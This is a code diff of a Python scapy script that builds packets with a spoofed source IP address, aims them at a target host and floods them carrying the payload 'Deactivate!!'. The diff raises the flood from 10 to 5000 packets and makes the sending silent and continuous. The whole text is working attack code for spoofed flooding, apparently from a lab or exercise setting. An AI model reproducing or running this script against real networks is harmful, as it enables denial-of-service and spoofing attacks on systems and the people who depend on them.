@@ -6,6 +6,7 @@ from scapy.layers.inet import *
 target = "10.12.1.4"
 spoof = "10.204.0.7"
 payload = "Deactivate!!"
+flood_amt = 5000
 packets = []
 
 def packet_craft(source_port):
@@ -17,7 +18,7 @@ def packet_craft(source_port):
 print "Beginning packet crafting ...\n"
 
 # First we craft a large number of packets using a random ephemeral port
-for i in range(10):
+for i in range(flood_amt):
     source_port = random.randint(1024, 65535)
     temp_packet = packet_craft(source_port)
     packets.append(temp_packet)
@@ -27,7 +28,9 @@ print "\nBeginning flood ...\n"
 
 # Initiate a packet flood using our crafted packets
 for p in packets:
-    send(p)
+    # verbose field sets output.  0 = silent.
+    # Timeout=0 forces send to operate continuously.
+    sr(p, verbose=0, timeout=0)
 
 print "Done flooding!\n"
 
